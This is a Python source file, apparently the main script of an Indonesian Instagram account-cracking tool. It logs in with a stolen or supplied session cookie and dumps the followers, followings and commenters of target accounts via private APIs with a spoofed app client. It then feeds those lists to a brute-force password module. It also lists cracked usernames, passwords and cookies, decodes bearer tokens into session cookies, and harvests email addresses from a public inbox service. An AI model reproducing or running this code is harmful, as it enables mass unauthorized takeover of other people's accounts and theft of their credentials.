#!/usr/bin/env python

"""
Copyright (c) 2023-2025 ibrut developers (https://github.com/khamdihi-dev)
Ganti Nama, Jual Enak Banget Lu, Gk Punya Malu??
Gaush di edit-edit nanti error!, Coba aja Kalo ga percaya
"""

import os
import re
import sys
import json
import time
import random
import base64
import questionary.styles
import requests
import questionary
import uuid

from lang import language
from method import ApiKey,Brute
from prompt_toolkit.styles import Style
from concurrent.futures import ThreadPoolExecutor
from security import password as changePASS
from twofactor import private_request as factor
from pointuser import reward
from dotenv import load_dotenv

load_dotenv()

bahasa = []
dumpdata = []

# version = sys.version.split(' ')[0][:4]
# if version != '3.12':
#     print(language.languages('id').get_python_update_instructions()['header'])
#     exit()

A = "\033[90m"   # Abu-abu
B = "\033[94m"   # Biru
C = "\033[96m"   # Cyan
D = "\033[91m"   # Merah Muda (Danger/Red)
E = "\033[95m"   # Ungu
F = "\033[35m"   # Fuchsia (Magenta)
G = "\033[92m"   # Hijau Muda (Green Light)
H = "\033[32m"   # Hijau
I = "\033[30m"   # Hitam
J = "\033[33m"   # Kuning Muda (Yellow)
K = "\033[37m"   # Putih (White - Alternative)
L = "\033[93m"   # Kuning Cerah (Lemon Yellow)
M = "\033[31m"   # Merah
N = "\033[34m"   # Biru Gelap (Navy Blue)
O = "\033[94m"   # Oranye (via Biru karena kode ANSI terbatas)
P = "\033[97m"   # Putih (Bright White)
Q = "\033[41m"   # Latar Merah (Quick Alert)
R = "\033[31m"   # Merah (Red)
S = "\033[36m"   # Cyan Muda (Sky Blue)
T = "\033[96m"   # Teal
U = "\033[35m"   # Ungu (Ungu Magenta)
V = "\033[34m"   # Biru Tua (Violet-ish)
W = "\033[37m"   # Putih
X = "\033[90m"   # Abu-abu Tua
Y = "\033[93m"   # Kuning
Z = "\033[33m"   # Kuning Gelap (Gold)

M3 = '\033[1m\033[38;5;88m'
BJ = '\033[1m\033[38;5;208m'

custom_style = Style.from_dict({
    "qmark": "fg:#fff bold",
    "question": "fg:#fff bold",
    "answer": "fg:#ff0000 underline",
    "pointer": "fg:#ff0000 bold",
    "highlighted": "fg:#ff0000 underline",
    "separator": "fg:#ffffff",
    "instruction": "fg:#ffffff italic",
})

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f'''{BJ}       _______ __  ____{P}____{BJ}
      / __/ (_) /_/ __/{P}_  /{BJ}
     / _// / / __/ _/{P}_/_ < {BJ}
    /___/_/_/\__/___/{P}____/{P} 
     
     Welcome to {BJ}Elite3 {D}: {H}20.1{P}
''')
    

class config:
    def __init__(self):
        self.ulsd = language.languages(bahasa[0])

    def pigeon(self):
        return f'UFS-{uuid.uuid4()}-0'

    def clintime(self):
        return str(time.time())[:14]
    
    def deviceid(self):
        return str(uuid.uuid4())
    
    def family(self):
        return str(uuid.uuid4())

    def androidid(self):
        return f'android-{str(uuid.uuid1().hex)[:16]}'
    
    def idbear(self, cokie):
        try:
            self.id = re.search(r'ds_user_id=(\d+);',str(cokie)).group(1)
            self.sn = re.search(r'sessionid=(.*?);',str(cokie)).group(1)
            self.br = base64.b64encode(json.dumps({'ds_user_id': self.id, 'sessionid': self.sn}).encode()).decode()
            return self.id, self.br
        except AttributeError:
            print(self.ulsd.Error_lang()['header'])
            sys.exit()

class Login:
    def __init__(self):
        self.ulsd = language.languages(bahasa[0])

    def putcokie(self):
        print(f'\n[{M}!{K}] '+self.ulsd.login_lang()['header'])
        self.cokie = input(f'[{H}?{K}] Masukan cookie : ')
        self.cokie +=';'
        self.sign = self.chekcokie(self.cokie)
        if self.sign == True:exit(f'[{H}+{K}] Login succes, jalankan {H}python3.12 {sys.argv[0]}{K}')
        else:self.Loginwith()

    def chekcokie(self, cokie):
        self.cokie = cokie
        if 'mid=' in str(self.cokie): self.mid = re.search('mid=(.*?);',str(self.cokie)).group(1)
        else: self.mid = ''
        with requests.Session() as self.r:
            try:
                self.insta = config()
                self.uid, self.bearer = self.insta.idbear(self.cokie)
                self.r.headers.update({
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-session-id': self.insta.pigeon(),
                    'x-pigeon-rawclienttime': self.insta.clintime(),
                    'x-ig-bandwidth-speed-kbps': str(round(random.uniform(1000, 10000), 3)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(1000000, 10000000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 10000)),
                    'x-bloks-version-id': 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd',
                    'x-ig-www-claim': '0',
                    'x-debug-www-claim-source': 'handleLogin3',
                    'x-bloks-prism-button-version': 'CONTROL',
                    'x-bloks-prism-colors-enabled': 'false',
                    'x-bloks-prism-ax-base-colors-enabled': 'false',
                    'x-bloks-prism-font-enabled': 'false',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': self.insta.deviceid(),
                    'x-ig-family-device-id': self.insta.family(),
                    'x-ig-android-id': self.insta.androidid(),
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-nav-chain': f'MainFeedFragment:feed_timeline:1:cold_start:{int(time.time())}.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:{int(time.time())}.356::',
                    'x-fb-connection-type': 'WIFI',
                    'x-ig-connection-type': 'WIFI',
                    'x-ig-capabilities': '3brTv10=',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'accept-language': 'id-ID, en-US',
                    'authorization': f'Bearer IGT:2:{self.bearer}',
                    'x-mid': self.mid,
                    'ig-u-ds-user-id': self.uid,
                    'ig-intended-user-id': self.uid,
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                })
                self.p = self.r.get(f'https://i.instagram.com/api/v1/users/{self.uid}/info/').json()['user']['full_name']
                open('data/login.txt','w').write(cokie)
                return True
            except:return False
    
    def find_result(self):

        def convert(bearer):
            try:
                coks = json.loads(base64.b64decode(bearer.split(':')[2]).decode())
                cokz = ';'.join(['%s=%s'%(name, value) for name,value in coks.items()])
                return cokz
            except Exception as e:
                print('failed decode bearer', e)
                return bearer
        try:
            self.file = os.listdir('data')
            self.copy = []
            print('')
            for self.y in self.file:
                if 'OK' in self.y: self.copy.append('data/'+self.y)
            _file = questionary.select(self.ulsd.select_file()['header'],choices=self.copy,style=custom_style).ask()
            for self.ceks in open(_file,'r').read().splitlines():
                try:
                    self.cokie = convert(json.loads(self.ceks)['cookie'])
                    self.sign = self.chekcokie(self.cokie+';')
                    if(self.sign == True): 
                        print('\nsuccess :',self.cokie)
                        exit()
                    else:print('\nfailed :',self.cokie)
                except:
                    if 'sessionid' in self.ceks:
                        self.cokie = re.search('datr=(.*)',self.ceks).group(1)
                        self.sign = self.chekcokie(f'datr={self.cokie};')
                        if self.sign == True:
                            print('\nsuccess :',self.cokie)
                            exit()
            exit('\nmokad semua cookienya')
        except FileNotFoundError:
            print(self.ulsd.Error_lang()['header'])
            exit()
    
    def Loginwith(self):
        _ask = questionary.select(self.ulsd.login_lang()['header'],choices=self.ulsd.login_withs()['header'],style=custom_style).ask()
        if 'cookie' in str(_ask):self.putcokie()
        else:self.find_result()

class infone:
    
    def __init__(self):
        self.cokie = open('data/login.txt','r').read()

    def profile(self):
        if 'mid=' in str(self.cokie): self.mid = re.search('mid=(.*?);',str(self.cokie)).group(1)
        else: self.mid = ''
        with requests.Session() as self.r:
            try:
                self.insta = config()
                self.uid, self.bearer = self.insta.idbear(self.cokie)
                self.r.headers.update({
                    'x-ig-app-locale': 'in_ID',
                    'x-ig-device-locale': 'in_ID',
                    'x-ig-mapped-locale': 'id_ID',
                    'x-pigeon-session-id': self.insta.pigeon(),
                    'x-pigeon-rawclienttime': self.insta.clintime(),
                    'x-ig-bandwidth-speed-kbps': str(round(random.uniform(1000, 10000), 3)),
                    'x-ig-bandwidth-totalbytes-b': str(random.randint(1000000, 10000000)),
                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 10000)),
                    'x-bloks-version-id': 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd',
                    'x-ig-www-claim': '0',
                    'x-debug-www-claim-source': 'handleLogin3',
                    'x-bloks-prism-button-version': 'CONTROL',
                    'x-bloks-prism-colors-enabled': 'false',
                    'x-bloks-prism-ax-base-colors-enabled': 'false',
                    'x-bloks-prism-font-enabled': 'false',
                    'x-bloks-is-layout-rtl': 'false',
                    'x-ig-device-id': self.insta.deviceid(),
                    'x-ig-family-device-id': self.insta.family(),
                    'x-ig-android-id': self.insta.androidid(),
                    'x-ig-timezone-offset': str(-time.timezone),
                    'x-ig-nav-chain': f'MainFeedFragment:feed_timeline:1:cold_start:{int(time.time())}.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:{int(time.time())}.356::',
                    'x-fb-connection-type': 'WIFI',
                    'x-ig-connection-type': 'WIFI',
                    'x-ig-capabilities': '3brTv10=',
                    'x-ig-app-id': '567067343352427',
                    'priority': 'u=3',
                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'accept-language': 'id-ID, en-US',
                    'authorization': f'Bearer IGT:2:{self.bearer}',
                    'x-mid': self.mid,
                    'ig-u-ds-user-id': self.uid,
                    'ig-intended-user-id': self.uid,
                    'x-fb-http-engine': 'Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True',
                })
                self.p = self.r.get(f'https://i.instagram.com/api/v1/users/{self.uid}/info/').json()['user']
                self.username = self.p['username']
                self.fullname = self.p['full_name']
                self.follower = self.p['follower_count']
                self.following = self.p['following_count']
                self.postingan = self.p['media_count']
                return self.username, self.fullname, self.follower, self.following,self.postingan

            except Exception as e:print(e)
class menu:
    def __init__(self):
        self.ulsd = language.languages(bahasa[0])
        self.uid_user = []
        self.uid_link = []
        self.listemail = []
        self.styl = {'choices':[],'qmark': '(?)','pointer': ' >'}

    def clear1(self):
        if os.path.isfile('data/login.txt'):
            self.cokz = open('data/login.txt','r').read()
            self.ceks = Login().chekcokie(self.cokz)
            if self.ceks is False:
                Login().Loginwith()
            return
        else:
            Login().Loginwith()

    def userPoint(self):
        self.pointuser = reward.point_new()
        self.free_keys, self.user_sisa, self.point_user = self.pointuser
        self.username, self.fullname, self.follower, self.following_info, self.postingan = infone().profile()
        self.gif = 'Free 1minggu' if self.user_sisa == 0 else f'{self.point_user}/{self.user_sisa}'
        print(f'''
All About you

    - Username  : {self.username}
    - Fullname  : {self.fullname}
    - Follower  : {self.follower}
    - Following : {self.following_info}
    - Postingan : {self.postingan}
    - Point     : {self.gif}

''')    
    def instagram(self):
        clear()
        self.clear1()
        self.userPoint()
        if os.path.isfile('data/.keys.txt') is False:ApiKey.UserKey().BuyLicen()
        else:ApiKey.UserKey().konfirkeys()
        self.dihi = self.ulsd.menu_list()['header']
        if len(self.styl['choices']) >0:self.styl['choices'].clear()
        self.styl['choices'].extend(self.dihi)
        self.sdyh = questionary.select(self.ulsd.menu_list()['message'],**self.styl, style=custom_style).ask()
        if self.sdyh == self.dihi[0]:self.userinfo()
        elif self.sdyh == self.dihi[1]:self.followers()
        elif self.sdyh == self.dihi[2]:self.following()
        elif self.sdyh == self.dihi[3]:self.komentar()
        elif self.sdyh == self.dihi[4]:self.hasil()
        elif self.sdyh == self.dihi[5]:self.crackulang()
        elif self.sdyh == self.dihi[6]:self.decode_bearer()
        elif self.sdyh == self.dihi[7]:self.stoksaya('https://github.com/khamdihi-dev/Prem/raw/refs/heads/main/stokakun.json')
        elif self.sdyh == self.dihi[8]:self.findinboxkitten()
        elif self.sdyh == self.dihi[9]:self.securityFree()
        elif self.sdyh == self.dihi[10]:
            self.deletekuki = input(f'\n[{H}?{K}] Hapus Cokie [y/N] : ').lower()
            if self.deletekuki == 'n':pass
            else:os.remove('data/login.txt')
            exit('\nGood Bye')

    def securityFree(self):
        self.ihah = self.ulsd.MenuSecurity()
        self.dihi = self.ihah['message']
        self.styl['choices'].clear()
        self.styl['choices'].extend(self.ihah['message'])
        self.sdyh = questionary.select(self.ihah['head'],**self.styl, style=custom_style).ask()
        if self.sdyh == self.dihi[3]:self.change_pas()
        if self.sdyh == self.dihi[6]:self.instagram()
        else:
            # exit('\nSedang dalam perbaikan..')
            factor.TwoFactor()
    
    def change_pas(self):
        print(f'\n[{H} PASSWORD CHANGE {K}]\n')
        self.cookie = input(f'[{H}?{K}] Cookie : ')
        self.OLDpw = input(f'[{H}?{K}] Sandi saat ini : ')
        self.Newpw = input(f'[{H}?{K}] Sandi Baru : ')
        print('\n')
        changePASS.change(self.cookie,self.OLDpw,self.Newpw)
        sys.exit()
        
        
    def findinboxkitten(self):
        self.filter = {'filter': False, 'platform': None}
        self.pesan = self.ulsd.findwithinbox()
        print(self.pesan['message'])
        self.kataKunci = input(self.pesan['message1']).replace(' ','').split(',')
        self.finterakun = input(self.pesan['message2']).lower()
        print('')
        if self.finterakun == 'y':
            self.listofmedsos = self.ulsd.MedsosList()['message']
            self.medsos = questionary.select(self.ulsd.MedsosList()['head'],choices=self.listofmedsos,**self.styl, style=custom_style).ask()
            self.filter.update({'filter':True,'platform':self.medsos})

        print(f'\nStart Find Email keyword : {self.kataKunci}\n')
        with ThreadPoolExecutor(max_workers=30) as self.execute:
            for self.keyword in self.kataKunci:
                self.execute.submit(self.findemail2, self.keyword, self.filter)

    def findemail2(self, keyword, rokok):
        try:
            self.req = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={keyword}').json()
            for self.iyah in self.req:
                if rokok['filter'] == True:
                    self.sendfrom = re.findall("'sender': '(.*?)'",str(self.iyah))[0]
                    self.surya = str(rokok['platform'].split(' ')[1].lower())
                    self.signature = re.findall("'recipient': '(.*?)'",str(self.iyah))[0]
                    if self.surya == 'facebook':
                        if 'facebook' in str(self.sendfrom) or 'facebookmail' in str(self.sendfrom) or 'support.facebook.com' in str(self.sendfrom):
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)
                    elif self.surya == 'tiktok':
                        if 'tiktok' in str(self.sendfrom) or 'support@tiktok.com' in str(self.sendfrom):
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)
                            
                    elif self.surya == 'instagram':
                        if 'instagram' in str(self.sendfrom) or 'support.instagram.com' in self.sendfrom or 'mail.instagram.com' in self.sendfrom:
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)
                    elif self.surya == 'twitter':
                        if 'x.com' in str(self.sendfrom) or 'twitter' in str(self.sendfrom):
                            if self.signature not in self.listemail:
                                print(self.signature)
                                self.listemail.append(self.signature)

                else:
                    self.sendfrom = re.findall("'sender': '(.*?)'",str(self.iyah))[0]
                    self.signature = re.findall("'recipient': '(.*?)'",str(self.iyah))[0]
                    if self.signature not in self.listemail:
                        print(f'Platform : {self.sendfrom}\nEmail : {self.signature}\n')
                        self.listemail.append(self.signature)

        except requests.exceptions.RequestException:
            time.sleep(10)


    def stoksaya(self,url):
        try:
            self.req = requests.get(url).json()
            print('\nAkun Sudah Aman Silahkan Kunjungi Akun Di Bawah ini\n')
            for self.index,self.yuhu in enumerate(self.req['usernames'],start=1):
                print(f'{self.index}. https://www.instagram.com/{self.yuhu}')

        except (requests.exceptions.RequestException,json.JSONDecodeError):
            exit('\nTerjadi kesalahan')

    def decode_bearer(self):
        try:
            print(f'\n[{H}+{K}] Tempel Bearer contoh : Bearer IGT:2:eyJkc191c2VyX2lkIjoiNDU0OTk2Njk2OTEiLCJzZXNzaW9uaWQiOiI0NTQ5OTY2OTY5MSUzQTVpRUxtYVhROTZCSW9jJTNBMTUlM0FBWWM5RjhyM1BXUHdfdVFpV0RqbGZCZTlZSGhpUVctUEQtYU1UVjg2NWcifQ==')
            code = input(f'[{H}+{K}] Bearer token : ').split(':')[2]
            dicx = json.loads(base64.b64decode(code).decode())
            print('\n')
            print(';'.join(['%s=%s'%(x,y) for x,y in dicx.items()]))
        except:
            exit('\nDecode Error')

    def userinfo(self):
        if os.path.isfile('data/.keys.txt') is False:ApiKey.UserKey().konfirkeys()
        if os.path.isfile('data/login.txt') is False:Login().Loginwith()
        self.ingf = self.ulsd.userandkeyinfo()
        self.keys = open('data/.info.txt','r').read()
        self.info = self.ingf['name']['headers']
        self.username, self.fullname, self.follower, self.following, self.postingan = infone().profile()
        self.info.update({
            'username': self.keys.split('|')[1],
            'bergabung': open('data/.join.txt','r').read(),
            'kadarluarsa': self.keys.split('|')[2],
            'licensi': self.keys.split('|')[0],
            'instagram username': self.username,
            'instagram fullname': self.fullname,
            'instagram follower': self.follower,
            'instagram following': self.following,
            'instagram postingan': self.postingan,
            'instagram cookies': open('data/login.txt','r').read()
        })
        if self.ingf['lang'] == 'en':
            print(f'''

username key       : {self.keys.split('|')[1]}
joined             : {self.info['bergabung']}
expiration         : {self.info['kadarluarsa']}
license            : {self.info['licensi']}

instagram username : {self.info['instagram username']}
instagram fullname : {self.info['instagram fullname']}
instagram followers: {self.info['instagram follower']}
instagram following: {self.info['instagram following']}
instagram posts    : {self.info['instagram postingan']}
instagram cookies  : {self.info['instagram cookies']}

            ''')
            return
        print(f'''

username key        : {self.keys.split('|')[1]}
bergabung           : {self.info['bergabung']}
kadarluarsa         : {self.info['kadarluarsa']}
license             : {self.info['licensi']}

instagram username  : {self.info['instagram username']}
instagram fullname  : {self.info['instagram fullname']}
instagram followrs  : {self.info['instagram follower']}
instagram following : {self.info['instagram following']}
instagram postingan : {self.info['instagram postingan']}
instagram cookies   : {self.info['instagram cookies']}
        ''')
    
    def followers(self):
        print(f'\n{self.ulsd.dumpflfw()["message"]}')
        self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
        for self.uname in self.username:
            self.uid = convert().usernametoid(self.uname)
            if(self.uid): self.uid_user.append(self.uid)
        if len(self.uid_user) == 0: exit('\nuserid not found')
        for self.userid in self.uid_user:
            dump().followers(self.userid, '')
        Brute.InstaHack(bahasa,dumpdata).methodList()

    def following(self):
        print(f'\n{self.ulsd.dumpflfw()["message"]}')
        self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
        for self.uname in self.username:
            self.uid = convert().usernametoid(self.uname)
            if(self.uid): self.uid_user.append(self.uid)
        if len(self.uid_user) == 0: exit('\nuserid not found')
        for self.userid in self.uid_user:
            dump().following(self.userid, '')
        Brute.InstaHack(bahasa,dumpdata).methodList()


    def komentar(self):
        print(f'\n{self.ulsd.komentar()["message"]}')
        self.tautan = input(self.ulsd.komentar()["input"])
        self.getmid = convert().media_id(self.tautan)
        if self.getmid == None: return self.instagram()
        dump().komentar(self.getmid,'')
        Brute.InstaHack(bahasa,dumpdata).methodList()

    def hasil(self):
        self.listfile = []
        self.lst = self.ulsd.chekhasil()['header']
        if len(self.styl['choices']) >0:self.styl['choices'].clear()
        self.styl['choices'].extend(self.lst)
        self.usr = questionary.select(self.ulsd.chekhasil()['message'],**self.styl,style=custom_style).ask()
        if self.usr == self.lst[0]:
            try:
                self.dirs = os.listdir('data')
                for self.alls in self.dirs:
                    if 'OK' not in self.alls:
                        continue
                    if self.alls not in self.listfile:self.listfile.append(self.alls)
                self.styl['choices'].clear()
                self.styl['choices'].extend(self.listfile)
                self.file = questionary.select(self.ulsd.chekhasil()['message1'], **self.styl, style=custom_style).ask()
                for self.xyz in open(f'data/{self.file}','r').read().splitlines():
                    try:
                        self.parse = json.loads(self.xyz)
                        print(f'''
username  : {self.parse['username']}
password  : {self.parse['password']}
followers : {self.parse['followers']}
following : {self.parse['following']}
cookies   : {self.parse['cookie']}
                            ''')
                    except:
                        print(self.xyz)
                sys.exit()
            except Exception as e:
                print(self.ulsd.Error_lang()['header'])
                exit(e)
        else:
            try:
                self.dirs = os.listdir('data')
                for self.alls in self.dirs:
                    if 'CP' not in self.alls:
                        continue
                    if self.alls not in self.listfile:self.listfile.append(self.alls)
                self.styl['choices'].clear()
                self.styl['choices'].extend(self.listfile)
                self.file = questionary.select(self.ulsd.chekhasil()['message1'], **self.styl, style=custom_style).ask()
                for self.xyz in open(f'data/{self.file}','r').read().splitlines():
                    try:
                        self.parse = json.loads(self.xyz)
                        print(f'''
username  : {self.parse['username']}
password  : {self.parse['password']}
followers : {self.parse['followers']}
following : {self.parse['following']}
''')
                    except:
                        print(self.xyz)
                sys.exit()
            except Exception as e:
                print(self.ulsd.Error_lang()['header'])
                exit(e)
    
    def crackulang(self):
        try:
            self.listfile = []
            self.dirs = os.listdir('data')
            for self.alls in self.dirs:
                if 'CP' not in self.alls:
                    continue
                if self.alls not in self.listfile:self.listfile.append(self.alls)
            if len(self.styl['choices']) >0:self.styl['choices'].clear()
            self.styl['choices'].extend(self.listfile)
            self.file = questionary.select(self.ulsd.chekhasil()['message1'],**self.styl,style=custom_style).ask()
            for self.xyz in open(f'data/{self.file}','r').read().splitlines():
                try:
                    self.parse = json.loads(self.xyz)
                    self.username, self.password = self.parse['username'], self.parse['password']
                except:
                    self.username = self.xyz.split('|')[0]
                    self.password = self.xyz.split('|')[1]
                dumpdata.append(f'{self.username}|{self.password}')
                    
            Brute.InstaHack(bahasa,dumpdata).methodList()
        except Exception as e:
            print(self.ulsd.Error_lang()['header'])
            exit(e)


class convert:
    def __init__(self):
        self.cokie = open('data/login.txt','r').read()

    def usernametoid(self, username):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'viewport-width': '673'
                })
                self.req = self.r.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}").json()['data']['user']['id']
                return self.req
            except:return None
    
    def media_id(self, posts_url):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Instagram 361.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'viewport-width': '673'
                })
                self.req1 = self.r.get(posts_url).text
                self.mid = re.search('{"media_id":"(.*?)"',str(self.req1)).group(1)
                return self.mid
            except AttributeError:return None

class dump:
    def __init__(self):
        self.cokie = open('data/login.txt','r').read()

    def followers(self,userid,next_pae):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '673'
                })
                self.data = {"query_hash": "c76146de99bb02f6415203be841dd25a","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
                for self.users in self.req['data']['user']['edge_followed_by']['edges']:
                    self.udata = self.users['node']['username']+'|'+self.users['node']['full_name'].replace('|','')
                    dumpdata.append(self.udata)
                    print(f'[{H}+{K}] success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                if(self.req['data']['user']['edge_followed_by']['page_info']['has_next_page']==True):
                    self.followers(userid, self.req['data']['user']['edge_followed_by']['page_info']['end_cursor'])
                else: return
            except:return
    
    def following(self,userid,next_pae):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '673'
                })
                self.data = {"query_hash": "d04b0a864b4b54837c0d870b0e77e076","variables": json.dumps({"id":userid,"first":150,"after":next_pae})}
                self.req = self.r.get('https://www.instagram.com/graphql/query/',params=self.data).json()
                for self.users in self.req['data']['user']['edge_follow']['edges']:
                    self.udata = self.users['node']['username']+'|'+self.users['node']['full_name'].replace('|','')
                    dumpdata.append(self.udata)
                    print(f'[{H}+{K}] success dump {len(dumpdata)}',end='\r'),sys.stdout.flush()
                if(self.req['data']['user']['edge_follow']['page_info']['has_next_page']==True):
                    self.following(userid, self.req['data']['user']['edge_follow']['page_info']['end_cursor'])
            except:return
    
    def komentar(self, media_id, min_cursor):
        with requests.Session() as self.r:
            try:
                self.r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': self.cokie,
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
                    'viewport-width': '1358',
                })
